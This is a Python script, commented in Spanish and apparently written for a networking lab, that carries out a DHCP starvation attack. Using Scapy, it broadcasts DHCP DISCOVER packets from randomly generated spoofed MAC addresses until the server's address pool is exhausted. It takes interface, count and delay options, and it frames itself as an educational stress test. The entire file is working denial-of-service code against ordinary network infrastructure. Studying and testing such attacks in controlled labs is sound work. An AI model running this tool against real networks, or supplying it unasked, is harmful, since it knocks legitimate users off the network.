#!/usr/bin/env python3
"""
Herramienta de Auditoría DHCP (Starvation) - ITLA Lab
Uso educativo para pruebas de estrés en entornos controlados.
"""

import argparse
import logging
import random
import sys
import time
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, conf

# Evitar que Scapy imprima mensajes en cada paquete
conf.verb = 0

# Configuración de logs
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger("DHCP-Audit")

class DHCPStressTest:
    def __init__(self, interface, packet_count, delay):
        self.interface = interface
        self.packet_count = packet_count
        self.delay = delay

    def _generate_mac(self):
        """Genera una MAC aleatoria unicast válida."""
        # El primer byte par (02, 04...) indica unicast local
        return "02:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )

    def _build_packet(self, mac):
        """Construye el paquete DHCP DISCOVER."""
        # Convertir MAC a bytes
        mac_bytes = bytes.fromhex(mac.replace(':', ''))
        
        # Estructura del paquete
        eth = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        
        bootp = BOOTP(
            op=1, 
            chaddr=mac_bytes + b'\x00' * 10,
            xid=random.randint(1, 0xFFFFFFFF),
            flags=0x8000 # Broadcast
        )
        
        dhcp = DHCP(options=[
            ("message-type", "discover"),
            ("client_id", b'\x01' + mac_bytes),
            "end"
        ])
        
        return eth / ip / udp / bootp / dhcp

    def start(self):
        logger.info(f"Iniciando carga DHCP en {self.interface}")
        logger.info(f"Meta: {self.packet_count} solicitudes | Intervalo: {self.delay}s")
        
        try:
            for i in range(self.packet_count):
                mac = self._generate_mac()
                pkt = self._build_packet(mac)
                sendp(pkt, iface=self.interface, verbose=False)
                
                if (i + 1) % 10 == 0:
                    sys.stdout.write(f"\r[+] Enviados: {i + 1}/{self.packet_count}")
                    sys.stdout.flush()
                
                time.sleep(self.delay)
                
            print("\n")
            logger.info("Proceso finalizado. Verifica el 'show ip dhcp binding' en el router.")
            
        except KeyboardInterrupt:
            print("\n")
            logger.warning("Detenido por el usuario.")

if __name__ == "__main__":
    # Argumentos CLI
    parser = argparse.ArgumentParser(description="Script de Auditoría DHCP Starvation")
    parser.add_argument("-i", "--interface", required=True, help="Interfaz de red (ej. eth0)")
    parser.add_argument("-n", "--number", type=int, default=200, help="Cantidad de paquetes")
    parser.add_argument("-t", "--time", type=float, default=0.05, help="Tiempo entre paquetes")
    
    args = parser.parse_args()
    
    # Ejecución
    tool = DHCPStressTest(args.interface, args.number, args.time)
    tool.start()